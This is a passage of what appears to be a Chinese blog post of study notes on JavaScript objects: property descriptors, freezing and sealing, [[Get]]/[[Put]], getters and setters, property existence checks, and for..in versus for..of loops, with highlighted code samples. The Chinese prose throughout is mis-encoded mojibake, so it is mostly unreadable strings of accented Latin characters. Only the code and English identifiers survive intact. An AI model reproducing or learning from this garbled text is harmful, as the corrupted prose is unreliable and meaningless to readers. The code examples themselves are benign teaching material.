æ–¹æ³•æ¥ä¿®æ”¹å±æ€§æè¿°ç¬¦ã€‚æ³¨æ„ï¼šä¸ç®¡æ˜¯ä¸æ˜¯å¤„äºä¸¥æ ¼æ¨¡å¼ï¼Œä¿®æ”¹ä¸€ä¸ªä¸å¯é…ç½®çš„å±æ€§æè¿°ç¬¦éƒ½ä¼šå‡ºé”™ã€‚å¹¶ä¸”<strong>æŠŠ configurable ä¿®æ”¹æˆ false æ˜¯å•å‘æ“ä½œï¼Œæ— æ³•æ’¤é”€ï¼</strong>é™¤äº†æ— æ³•ä¿®æ”¹ï¼Œ<strong>configurable:false è¿˜ä¼šç¦æ­¢åˆ é™¤è¿™ä¸ªå±æ€§</strong>ã€‚</li><li><strong>Enumerable</strong>  å†³å®šè¯¥å±æ€§æ˜¯å¦ä¼šå‡ºç°åœ¨å¯¹è±¡çš„å±æ€§æšä¸¾ä¸­ã€‚æ¯”å¦‚è¯´ for..in å¾ªç¯ï¼Œå¦‚æœæŠŠ enumerable è®¾ç½®æˆ falseï¼Œè¿™ä¸ªå±æ€§å°±ä¸ä¼šå‡ºç°åœ¨æšä¸¾ä¸­ï¼Œè™½ç„¶ä»ç„¶å¯ä»¥æ­£å¸¸è®¿é—®å®ƒã€‚</li></ul><h4 id="3-3-6-ä¸å˜æ€§"><a href="#3-3-6-ä¸å˜æ€§" class="headerlink" title="3.3.6 ä¸å˜æ€§"></a>3.3.6 <strong>ä¸å˜æ€§</strong></h4><p><strong>æ³¨æ„:</strong> <strong>è¿™äº›æ‰€æœ‰æ–¹æ³•éƒ½æ˜¯åªèƒ½æµ…ä¸å˜</strong>ï¼Œå¦‚æœç›®æ ‡å¯¹è±¡å¼•ç”¨äº†å…¶ä»–å¯¹è±¡(æ•°ç»„ã€å¯¹è±¡ã€å‡½æ•°ç­‰)ï¼Œå…¶ä»–å¯¹è±¡çš„å†…å®¹ä¸å—å½±å“ï¼Œä»ç„¶æ˜¯å¯å˜çš„ã€‚ç±»ä¼¼äºæµ…æ‹·è´.</p><p><strong>è¯´æ˜:</strong>  <strong>åœ¨ JavaScript ç¨‹åºä¸­å¾ˆå°‘éœ€è¦æ·±ä¸å¯å˜æ€§ã€‚</strong></p><p><strong>æ–¹æ³•:</strong></p><ol><li><strong>å¯¹è±¡å¸¸é‡(ä¸å¯æ”¹)</strong> ç»“åˆ writable:false å’Œ configurable:false å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªçœŸæ­£çš„å¸¸é‡å±æ€§(ä¸å¯ä¿®æ”¹ã€é‡å®šä¹‰æˆ–è€…åˆ é™¤)</li><li><strong>ç¦æ­¢æ‰©å±•(ä¸å¯å¢)</strong> ä½¿ç”¨ Object.prevent Extensions(myObject)ï¼Œå¯ä»¥ç¦æ­¢ä¸€ä¸ªå¯¹è±¡æ·»åŠ æ–°å±æ€§å¹¶ä¸”ä¿ç•™å·²æœ‰å±æ€§ã€‚åœ¨éä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œåˆ›å»ºå±æ€§ b ä¼šé™é»˜å¤±è´¥ã€‚åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œå°†ä¼šæŠ›å‡º TypeError é”™è¯¯ã€‚</li><li><strong>å¯†å°(ä¸å¯é…ç½®ï¼Œä½†å¯ä¿®æ”¹)</strong> ä½¿ç”¨Object.seal(..) ä¼šåˆ›å»ºä¸€ä¸ªâ€œå¯†å°â€çš„å¯¹è±¡ï¼Œè¿™ä¸ªæ–¹æ³•å®é™…ä¸Šä¼šåœ¨ä¸€ä¸ªç°æœ‰å¯¹è±¡ä¸Šè°ƒç”¨Object.preventExtensions(..) å¹¶æŠŠæ‰€æœ‰ç°æœ‰å±æ€§æ ‡è®°ä¸º <strong>configurable:false</strong>ã€‚å¯†å°ä¹‹åä¸ä»…ä¸èƒ½æ·»åŠ æ–°å±æ€§ï¼Œä¹Ÿä¸èƒ½é‡æ–°é…ç½®æˆ–è€…åˆ é™¤ä»»ä½•ç°æœ‰å±æ€§(è™½ç„¶å¯ä»¥ä¿®æ”¹å±æ€§çš„å€¼)ã€‚</li><li><strong>å†»ç»“(ä¸å¯é…ç½®ï¼Œä¹Ÿä¸å¯ä¿®æ”¹)</strong> Object.freeze(..) ä¼šåˆ›å»ºä¸€ä¸ªå†»ç»“å¯¹è±¡ï¼Œè¿™ä¸ªæ–¹æ³•å®é™…ä¸Šä¼šåœ¨ä¸€ä¸ªç°æœ‰å¯¹è±¡ä¸Šè°ƒç”¨ Object.seal(..) å¹¶æŠŠæ‰€æœ‰â€œæ•°æ®è®¿é—®â€å±æ€§æ ‡è®°ä¸º writable:falseï¼Œè¿™æ ·å°±æ— æ³•ä¿®æ”¹å®ƒä»¬çš„å€¼ã€‚è¿™ä¸ªæ–¹æ³•æ˜¯ä½ å¯ä»¥åº”ç”¨åœ¨å¯¹è±¡ä¸Šçš„çº§åˆ«æœ€é«˜çš„ä¸å¯å˜æ€§ï¼Œå®ƒä¼šç¦æ­¢å¯¹äºå¯¹è±¡æœ¬èº«åŠå…¶ä»»æ„ç›´æ¥å±æ€§çš„ä¿®æ”¹</li></ol><p><strong>æ³¨æ„:</strong> ä½ å¯ä»¥â€œæ·±åº¦å†»ç»“â€ä¸€ä¸ªå¯¹è±¡(è¿å¼•ç”¨çš„å¯¹è±¡ä¹Ÿå†»ç»“)ï¼Œå…·ä½“æ–¹æ³•ä¸ºï¼Œé¦–å…ˆåœ¨è¿™ä¸ªå¯¹è±¡ä¸Šè°ƒç”¨ Object.freeze(..)ï¼Œ ç„¶åéå†å®ƒå¼•ç”¨çš„æ‰€æœ‰å¯¹è±¡å¹¶åœ¨è¿™äº›å¯¹è±¡ä¸Šè°ƒç”¨ Object.freeze(..)ã€‚ä½†æ˜¯ä¸€å®šè¦è°¨æ…ï¼Œå› ä¸ºä½ å¼•ç”¨çš„å¯¹è±¡å¯èƒ½ä¼šåœ¨å…¶ä»–åœ°å‘ä¹Ÿè¢«å¼•ç”¨.</p><h4 id="3-3-7-Get"><a href="#3-3-7-Get" class="headerlink" title="3.3.7 [[Get]]"></a>3.3.7 <strong>[[Get]]</strong></h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject = &#123; </span><br><span class="line">   <span class="attr">a</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line">myObject.a; <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p><strong>myObject.aæ˜¯æ€ä¹ˆå–åˆ°å€¼2çš„ï¼Ÿ</strong><br>myObject.a é€šè¿‡å¯¹è±¡é»˜è®¤å†…ç½®çš„[[Get]] æ“ä½œã€‚é¦–å…ˆå®ƒä¼šåœ¨å¯¹è±¡ä¸­æŸ¥æ‰¾æ˜¯å¦æœ‰åç§°ç›¸åŒçš„å±æ€§ï¼Œ å¦‚æœæ‰¾åˆ°å°±ä¼šè¿”å›è¿™ä¸ªå±æ€§çš„å€¼ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°åç§°ç›¸åŒçš„å±æ€§ï¼ŒæŒ‰ç…§ [[Get]] ç®—æ³•çš„å®šä¹‰ä¼šæ‰§è¡Œå¦å¤–ä¸€ç§éå¸¸é‡è¦çš„è¡Œä¸ºï¼šå…¶å®å°±æ˜¯éå†å¯èƒ½å­˜åœ¨çš„ [[Prototype]] é“¾ï¼Œä¹Ÿå°±æ˜¯åœ¨åŸå‹é“¾ä¸Šå¯»æ‰¾è¯¥å±æ€§ã€‚å¦‚æœä»ç„¶éƒ½æ²¡æœ‰æ‰¾åˆ°åç§°ç›¸åŒçš„å±æ€§ï¼Œé‚£ [[Get]] æ“ä½œä¼šè¿”å›å€¼ undefinedã€‚</p><p><strong>æ³¨æ„:</strong> å¦‚æœä½ å¼•ç”¨äº†ä¸€ä¸ªå½“å‰<strong>è¯æ³•ä½œç”¨åŸŸ</strong>ä¸­ä¸å­˜åœ¨çš„å˜é‡ï¼Œå¹¶ä¸ä¼šåƒå¯¹è±¡å±æ€§ä¸€æ ·è¿”å› undefinedï¼Œè€Œæ˜¯ä¼šæŠ›å‡ºä¸€ä¸ª ReferenceError å¼‚å¸¸ã€‚</p><h4 id="3-3-8-Put"><a href="#3-3-8-Put" class="headerlink" title="3.3.8 [[Put]]"></a>3.3.8 <strong>[[Put]]</strong></h4><p>æ—¢ç„¶æœ‰å¯ä»¥è·å–å±æ€§å€¼çš„ [[Get]] æ“ä½œï¼Œå°±ä¸€å®šæœ‰å¯¹åº”çš„ [[Put]] æ¥è®¾ç½®æˆ–è€…åˆ›å»ºå±æ€§ã€‚ [[Put]] è¢«è§¦å‘æ—¶çš„æ“ä½œåˆ†ä¸ºä¸¤ä¸ªæƒ…å†µï¼š1. å¯¹è±¡ä¸­å·²ç»å­˜åœ¨è¿™ä¸ªå±æ€§   2. å¯¹è±¡ä¸­ä¸å­˜åœ¨è¿™ä¸ªå±æ€§ã€‚</p><p>å¦‚æœå¯¹è±¡ä¸­å·²ç»å­˜åœ¨è¿™ä¸ªå±æ€§ï¼Œ[[Put]] ç®—æ³•å¤§è‡´ä¼šæ£€æŸ¥ä¸‹é¢è¿™äº›å†…å®¹:</p><ol><li>å±æ€§æ˜¯å¦æ˜¯è®¿é—®æè¿°ç¬¦ï¼Ÿå¦‚æœæ˜¯å¹¶ä¸”å­˜åœ¨setterå°±è°ƒç”¨setterã€‚</li><li>å±æ€§çš„æ•°æ®æè¿°ç¬¦ä¸­writableæ˜¯å¦æ˜¯falseï¼Ÿå¦‚æœæ˜¯ï¼Œåœ¨éä¸¥æ ¼æ¨¡å¼ä¸‹é™é»˜å¤±è´¥ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹æŠ›å‡º TypeError å¼‚å¸¸ã€‚</li><li>å¦‚æœéƒ½ä¸æ˜¯ï¼Œå°†è¯¥å€¼è®¾ç½®ä¸ºå±æ€§çš„å€¼ã€‚</li></ol><p>å¦‚æœå¯¹è±¡ä¸­ä¸å­˜åœ¨è¿™ä¸ªå±æ€§ï¼Œ[[Put]] æ“ä½œä¼šæ›´åŠ å¤æ‚ã€‚åœ¨ç¬¬ 5 ç« è®¨è®º [[Prototype]] æ—¶è¯¦ç»†ä»‹ç»ã€‚</p><h4 id="3-3-9-Getterå’ŒSetter"><a href="#3-3-9-Getterå’ŒSetter" class="headerlink" title="3.3.9 Getterå’ŒSetter"></a>3.3.9 <strong>Getterå’ŒSetter</strong></h4><p>å¯¹è±¡é»˜è®¤çš„ [[Put]] å’Œ [[Get]] æ“ä½œåˆ†åˆ«å¯ä»¥æ§åˆ¶å±æ€§å€¼çš„è®¾ç½®å’Œè·å–ã€‚ç›®å‰æˆ‘ä»¬è¿˜æ— æ³•æ“ä½œ[[Get]] å’Œ [[Put]]æ¥æ”¹å†™æ•´ä¸ªå¯¹è±¡ ï¼Œä½†æ˜¯åœ¨ES5ä¸­å¯ä»¥ä½¿ç”¨ getter å’Œ setter æ”¹å†™<strong>éƒ¨åˆ†</strong>é»˜è®¤æ“ä½œï¼Œ<strong>åªèƒ½åº”ç”¨åœ¨å•ä¸ªå±æ€§ä¸Šï¼Œæ— æ³•åº”ç”¨åœ¨æ•´ä¸ªå¯¹è±¡ä¸Š</strong>ã€‚    </p><p><strong>æ³¨æ„:</strong> ä¹¦ä¸­åé¢è¯´çš„<code>è®¿é—®æè¿°ç¬¦</code>å°±æ˜¯<code>å­˜å–æè¿°ç¬¦</code>ã€‚</p><p><strong>getter:</strong><br>getter æ˜¯ä¸€ä¸ªéšè—å‡½æ•°ï¼Œä¼šåœ¨è·å–å±æ€§å€¼æ—¶è°ƒç”¨ã€‚åŒæ—¶ä¼šè¦†ç›–è¯¥å•ä¸ªå±æ€§é»˜è®¤çš„ [[Get]]æ“ä½œã€‚<strong>å½“ä½ è®¾ç½®getteræ—¶ï¼Œä¸èƒ½åŒæ—¶å†è®¾ç½®valueæˆ–writableï¼Œå¦åˆ™å°±ä¼šäº§ç”Ÿä¸€ä¸ªå¼‚å¸¸ã€‚å¹¶ä¸”å½“ä½ è®¾ç½®getteræˆ–setteræ—¶ï¼ŒJavaScript ä¼šå¿½ç•¥å®ƒä»¬çš„ value å’Œ writable ç‰¹æ€§ã€‚</strong></p><p><strong>è¯­æ³•:</strong> <code>&#123;get prop() &#123; ... &#125; &#125;</code>æˆ–<code>&#123;get [expression]() &#123; ... &#125; &#125;</code>ã€‚<br><strong>ä½¿ç”¨æ–¹å¼:</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1111</span>ï¼Œ <span class="comment">//åœ¨åé¢ä¼šå‘ç°myObject.aä¸º2ï¼Œè¿™æ˜¯å› ä¸ºè®¾ç½®äº†getteræ‰€ä»¥å¿½ç•¥äº†valueç‰¹æ€§.</span></span><br><span class="line">  <span class="comment">//æ–¹å¼ä¸€:åœ¨æ–°å¯¹è±¡åˆå§‹åŒ–æ—¶å®šä¹‰ä¸€ä¸ªgetter</span></span><br><span class="line">  <span class="keyword">get</span> <span class="title">a</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty( </span><br><span class="line">  myObjectï¼Œ <span class="comment">// ç›®æ ‡å¯¹è±¡ </span></span><br><span class="line">  <span class="string">&quot;b&quot;</span>ï¼Œ <span class="comment">// å±æ€§å</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// æ–¹å¼äºŒ:ä½¿ç”¨definePropertyåœ¨ç°æœ‰å¯¹è±¡ä¸Šå®šä¹‰ getter</span></span><br><span class="line">    <span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="built_in">this</span>.a * <span class="number">2</span> &#125;ï¼Œ</span><br><span class="line">    <span class="comment">// ç¡®ä¿ b ä¼šå‡ºç°åœ¨å¯¹è±¡çš„å±æ€§åˆ—è¡¨ä¸­</span></span><br><span class="line">    <span class="attr">enumerable</span>: <span class="literal">true</span></span><br><span class="line">   &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">myObject.a = <span class="number">3</span>;  <span class="comment">//å› ä¸ºè®¾ç½®äº†getteræ‰€ä»¥å¿½ç•¥äº†writableç‰¹æ€§.æ‰€ä»¥è¿™é‡Œèµ‹å€¼æ²¡æˆåŠŸ</span></span><br><span class="line">myObject.a; <span class="comment">// 2</span></span><br><span class="line">myObject.b; <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> myObject.a;<span class="comment">//å¯ä»¥ä½¿ç”¨deleteæ“ä½œç¬¦åˆ é™¤</span></span><br></pre></td></tr></table></figure><p><strong>setter:</strong><br>setter æ˜¯ä¸€ä¸ªéšè—å‡½æ•°ï¼Œä¼šåœ¨è·å–å±æ€§å€¼æ—¶è°ƒç”¨ã€‚åŒæ—¶ä¼šè¦†ç›–è¯¥å•ä¸ªå±æ€§é»˜è®¤çš„ [[Put]]æ“ä½œ(ä¹Ÿå°±æ˜¯èµ‹å€¼æ“ä½œ).<strong>å½“ä½ è®¾ç½®setteræ—¶ï¼Œä¸èƒ½åŒæ—¶å†è®¾ç½®valueæˆ–writableï¼Œå¦åˆ™å°±ä¼šäº§ç”Ÿä¸€ä¸ªå¼‚å¸¸.å¹¶ä¸”å½“ä½ è®¾ç½®getteræˆ–setteræ—¶ï¼ŒJavaScript ä¼šå¿½ç•¥å®ƒä»¬çš„ value å’Œ writable ç‰¹æ€§.</strong>        </p><p><strong>è¯­æ³•:</strong> <code>&#123;set prop(val) &#123; . . . &#125;&#125;</code>æˆ–<code>&#123;set [expression](val) &#123; . . . &#125;&#125;</code>ã€‚<br><strong>ä½¿ç”¨æ–¹å¼:</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject = &#123;</span><br><span class="line">  <span class="comment">//æ³¨æ„:é€šå¸¸æ¥è¯´ getter å’Œ setter æ˜¯æˆå¯¹å‡ºç°çš„(åªå®šä¹‰ä¸€ä¸ªçš„è¯ é€šå¸¸ä¼šäº§ç”Ÿæ„æ–™ä¹‹å¤–çš„è¡Œä¸º):</span></span><br><span class="line">  <span class="comment">//æ–¹å¼ä¸€:åœ¨æ–°å¯¹è±¡åˆå§‹åŒ–æ—¶å®šä¹‰ä¸€ä¸ªsetter</span></span><br><span class="line">  <span class="keyword">set</span> <span class="title">a</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="built_in">this</span>._a_ = val * <span class="number">2</span></span><br><span class="line">  &#125;ï¼Œ</span><br><span class="line">  <span class="keyword">get</span> <span class="title">a</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._a_ </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty( </span><br><span class="line">  myObjectï¼Œ <span class="comment">// ç›®æ ‡å¯¹è±¡ </span></span><br><span class="line">  <span class="string">&quot;b&quot;</span>ï¼Œ <span class="comment">// å±æ€§å</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">set</span>: <span class="function"><span class="keyword">function</span>(<span class="params">val</span>)</span>&#123; <span class="built_in">this</span>._b_ = val * <span class="number">3</span> &#125;ï¼Œ</span><br><span class="line">    <span class="comment">// æ–¹å¼äºŒ:ä½¿ç”¨definePropertyåœ¨ç°æœ‰å¯¹è±¡ä¸Šå®šä¹‰ setter</span></span><br><span class="line">    <span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="built_in">this</span>._b_ &#125;ï¼Œ</span><br><span class="line">    <span class="comment">// ç¡®ä¿ b ä¼šå‡ºç°åœ¨å¯¹è±¡çš„å±æ€§åˆ—è¡¨ä¸­</span></span><br><span class="line">    <span class="attr">enumerable</span>: <span class="literal">true</span></span><br><span class="line">   &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">myObject.a = <span class="number">2</span>;  </span><br><span class="line">myObject.b = <span class="number">3</span>;  </span><br><span class="line"><span class="built_in">console</span>.log(myObject.a); <span class="comment">//4</span></span><br><span class="line"><span class="built_in">console</span>.log(myObject.b);<span class="comment">//9</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(myObject._a_);<span class="comment">//4</span></span><br><span class="line"><span class="built_in">console</span>.log(myObject._b_);<span class="comment">//9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> myObject.a;<span class="comment">//å¯ä»¥ä½¿ç”¨deleteæ“ä½œç¬¦åˆ é™¤</span></span><br></pre></td></tr></table></figure><h4 id="3-3-10-å­˜åœ¨æ€§"><a href="#3-3-10-å­˜åœ¨æ€§" class="headerlink" title="3.3.10 å­˜åœ¨æ€§"></a>3.3.10 <strong>å­˜åœ¨æ€§</strong></h4><p><strong>å±æ€§å­˜åœ¨æ€§:</strong><br>å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦å­˜åœ¨æŸä¸ªå±æ€§(å‡†ç¡®æ¥è¯´æ˜¯<strong>æ£€æŸ¥è¿™ä¸ªå±æ€§åæ˜¯å¦å­˜åœ¨</strong>)ï¼Œè¿™æ—¶å°±éœ€è¦ç”¨åˆ°:</p><ul><li><p><code>in</code>æ“ä½œç¬¦ï¼šin æ“ä½œç¬¦ä¼šæ£€æŸ¥å±æ€§æ˜¯å¦åœ¨å¯¹è±¡åŠå…¶ [[Prototype]] åŸå‹é“¾ä¸­(è§ç¬¬ 5 ç« )ã€‚</p></li><li><p>hasOwnProperty(..) ï¼šhasOwnProperty(..) åªä¼šæ£€æŸ¥å±æ€§æ˜¯å¦åœ¨ myObject å¯¹è±¡ä¸­ï¼Œä¸ä¼šæ£€æŸ¥ [[Prototype]] é“¾ã€‚</p></li></ul><p><strong>æ³¨æ„:</strong></p><ul><li>å¦‚æœæœ‰çš„å¯¹è±¡å¯èƒ½æ²¡æœ‰è¿æ¥åˆ° Object.prototype( é€šè¿‡Object. create(null) æ¥åˆ›å»ºâ€”â€”è§ç¬¬ 5 ç« )ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½¢å¦‚myObejct.hasOwnProperty(..) å°±ä¼šå¤±è´¥ã€‚è¿™æ—¶å¯ä»¥ä½¿ç”¨ä¸€ç§æ›´åŠ å¼ºç¡¬çš„æ–¹æ³•æ¥è¿›è¡Œåˆ¤æ–­:Object.prototype.hasOwnProperty. call(myObjectï¼Œâ€aâ€)ï¼Œå®ƒå€Ÿç”¨åŸºç¡€çš„ hasOwnProperty(..) æ–¹æ³•å¹¶æŠŠå®ƒæ˜¾å¼ç»‘å®š(è§ç¬¬2ç« )åˆ° myObject ä¸Šã€‚</li><li>å¯¹äºæ•°ç»„æ¥è¯´ï¼Œä¸è¦ä½¿ç”¨inæ“ä½œç¬¦ï¼Œå› ä¸ºå®ƒæ£€æŸ¥çš„æ˜¯å±æ€§åï¼Œåœ¨æ•°ç»„ä¸­å±æ€§åå°±æ˜¯ç´¢å¼•ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬æ‰€å…³æ³¨çš„é‡ç‚¹ã€‚å¯¹äºæ•°ç»„æˆ‘ä»¬æ›´å…³æ³¨çš„æ˜¯å®ƒæ‰€å­˜çš„å€¼ï¼Œæ‰€ä»¥å¯¹äºæ•°ç»„æ£€æŸ¥æŸä¸ªå€¼æ˜¯å¦å­˜åœ¨è¿˜æ˜¯é‡‡ç”¨ <strong>indexOf</strong> æ–¹æ³•ã€‚</li></ul><p><strong>å±æ€§å¯æšä¸¾æ€§:</strong><br>å¦‚æœä¸€ä¸ªå±æ€§<strong>å­˜åœ¨</strong>ï¼Œä¸”å®ƒçš„<strong>enumerable å±æ€§æè¿°ç¬¦ä¸º true</strong> æ—¶ï¼Œåˆ™å®ƒæ˜¯å¯æšä¸¾çš„ï¼Œå¹¶ä¸”å¯ä»¥è¢« for..in å¾ªç¯ã€‚ï¼ˆç¼ºä¸€ä¸å¯ï¼‰    </p><p><strong>æ³¨æ„:</strong> forâ€¦inä¸é€‚åˆå¯¹æ•°ç»„è¿›è¡Œéå†ï¼Œå¯¹æ•°ç»„çš„éå†è¿˜æ˜¯ä½¿ç”¨ä¼ ç»Ÿçš„forå¾ªç¯.     </p><p>å¯¹å±æ€§çš„å¯æšä¸¾æ€§åˆ¤æ–­ï¼Œéœ€è¦ç”¨åˆ°ä»¥ä¸‹å‡ ç§æ–¹æ³•:</p><ul><li>propertyIsEnumerable(..) ä¼šæ£€æŸ¥ç»™å®šçš„å±æ€§åæ˜¯å¦ç›´æ¥å­˜åœ¨äºå¯¹è±¡ä¸­(è€Œä¸æ˜¯åœ¨åŸå‹é“¾ä¸Š)å¹¶ä¸”æ»¡è¶³ enumerable:trueã€‚</li><li>Object.keys(..) ä¼šè¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«æ‰€æœ‰å¯æšä¸¾å±æ€§ã€‚</li><li>Object.getOwnPropertyNames(..)ä¼šè¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«æ‰€æœ‰å±æ€§ï¼Œæ— è®ºå®ƒä»¬æ˜¯å¦å¯æšä¸¾ã€‚</li></ul><h3 id="3-4-éå†"><a href="#3-4-éå†" class="headerlink" title="3.4 éå†"></a>3.4 éå†</h3><p><strong>for..in</strong></p><ul><li>for..in å¾ªç¯å¯ä»¥ç”¨æ¥éå†å¯¹è±¡çš„å¯æšä¸¾å±æ€§åˆ—è¡¨(<strong>åŒ…æ‹¬ [[Prototype]] é“¾</strong>)ã€‚</li><li>å®é™…ä¸Šfor..inéå†çš„å¹¶ä¸æ˜¯å±æ€§å€¼ï¼Œè€Œæ˜¯å±æ€§å(å³é”®å key)ã€‚æ‰€ä»¥æƒ³è·å–å±æ€§å€¼è¿˜æ˜¯éœ€è¦æ‰‹åŠ¨ä½¿ç”¨obj[key]æ¥è·å–.</li><li>ä¸€èˆ¬åœ¨éå†å¯¹è±¡æ—¶ï¼Œæ¨èä½¿ç”¨for..in.å½“ç„¶æ•°ç»„ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨for..inçš„ã€‚åœ¨éå†æ•°ç»„æ—¶ï¼Œæ¨èè¿˜æ˜¯ä½¿ç”¨for..ofã€‚</li></ul><p><strong>for..of</strong></p><ul><li>ES6 å¢åŠ äº†ä¸€ç§ç”¨æ¥éå†<strong>æ•°ç»„</strong>çš„ for..of å¾ªç¯è¯­æ³•ã€‚</li><li>for..ofä¸for..inæœ€å¤§çš„ä¸åŒç‚¹æ˜¯ï¼Œ<strong>å®ƒå¾ªç¯çš„æ˜¯å±æ€§å€¼ï¼Œè€Œä¸æ˜¯å±æ€§åã€‚ä¸è¿‡å®ƒåªå¾ªç¯æ•°ç»„é‡Œå­˜æ”¾çš„å€¼ï¼Œä¸ä¼šæ¶‰åŠåˆ°å¯¹è±¡é‡Œçš„keyã€‚</strong></li><li>for..of å¾ªç¯é¦–å…ˆä¼šå‘è¢«è®¿é—®å¯¹è±¡è¯·æ±‚ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡ï¼Œç„¶åé€šè¿‡è°ƒç”¨è¿­ä»£å™¨å¯¹è±¡çš„next() æ–¹æ³•æ¥éå†æ‰€æœ‰è¿”å›å€¼ã€‚æ•°ç»„æœ‰å†…ç½®çš„ @@iterator(å¯¹è±¡æ²¡æœ‰ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨for..ofï¼Œé™¤éæˆ‘ä»¬è‡ªå·±å®šä¹‰ä¸€ä¸ª)ï¼Œå› æ­¤ for..of å¯ä»¥ç›´æ¥åº”ç”¨åœ¨æ•°ç»„ä¸Šã€‚</li></ul><p><strong>ä¾‹å­æ¯”è¾ƒ</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;shotCat&#x27;</span>ï¼Œ<span class="number">111</span>ï¼Œ&#123;<span class="attr">a</span>:<span class="string">&#x27;1&#x27;</span>ï¼Œb:<span class="string">&#x27;2&#x27;</span>&#125;]</span><br><span class="line">arr.say=<span class="string">&quot;IG niu pi!&quot;</span></span><br><span class="line"><span class="comment">//ä½¿ç”¨for..inå¾ªç¯</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> index <span class="keyword">in</span> arr)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(arr[index]);<span class="comment">//shotCat  111  &#123;a:&#x27;1&#x27;ï¼Œb:&#x27;2&#x27;&#125;  IG niu pi!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä½¿ç”¨for..ofå¾ªç¯</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> value <span class="keyword">of</span> arr)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value);<span class="comment">//shotCat  111  &#123;a:&#x27;1&#x27;ï¼Œb:&#x27;2&#x27;&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ³¨æ„ for..ofå¹¶æ²¡æœ‰éå†å¾—åˆ°` IG niu pi!`.åŸå› æˆ‘å‰é¢è¯´è¿‡`å®ƒåªå¾ªç¯æ•°ç»„é‡Œå­˜æ”¾çš„å€¼ï¼Œä¸ä¼šæ¶‰åŠåˆ°å¯¹è±¡é‡Œçš„key.`æ›´ä¸ç”¨è¯´ [[Prototype]] é“¾.(for..inåˆ™ä¼š)</span></span><br></pre></td></tr></table></figure><p><strong>å¦‚ä½•è®©å¯¹è±¡ä¹Ÿèƒ½ä½¿ç”¨for..of ï¼Ÿ</strong><br>å¯ä»¥é€‰æ‹©ä½¿ç”¨ä¹¦ä¸­çš„é€šè¿‡Object.defineProperty()å®šä¹‰ä¸€ä¸ªSymbol.iteratorå±æ€§æ¥å®ç°ï¼›ä¹Ÿå¯ä»¥å’ŒObject.keys()æ­é…ä½¿ç”¨.ä¸¾ä¸ªä¾‹å­:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shotCat=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;shotCat&#x27;</span>ï¼Œ</span><br><span class="line">    <span class="attr">age</span>:<span class="string">&#x27;forever18&#x27;</span>ï¼Œ</span><br><span class="line">    <span class="attr">info</span>:&#123;</span><br><span class="line"><span class="attr">sex</span>:<span class="string">&#x27;true man&#x27;</span>ï¼Œ</span><br><span class="line">    <span class="attr">city</span>:<span class="string">&#x27;wuhan&#x27;</span>ï¼Œ</span><br><span class="line">    <span class="attr">girlFriend</span>:<span class="string">&#x27;æ–°å£ç»“è¡£!&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(shotCat))&#123;</span><br><span class="line">    <span class="comment">//ä½¿ç”¨Object.keys()æ–¹æ³•è·å–å¯¹è±¡keyçš„æ•°ç»„</span></span><br><span class="line">    <span class="built_in">console</span>.log(key+<span class="string">&quot;: &quot;</span>+shotCat[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5-å°ç»“-1"><a href="#3-5-å°ç»“-1" class="headerlink" title="3.5 å°ç»“"></a>3.5 å°ç»“</h3><ul><li>JavaScript ä¸­çš„å¯¹è±¡æœ‰<strong>å­—é¢å½¢å¼</strong>(æ¯”å¦‚ var a = { .. })å’Œ<strong>æ„é€ 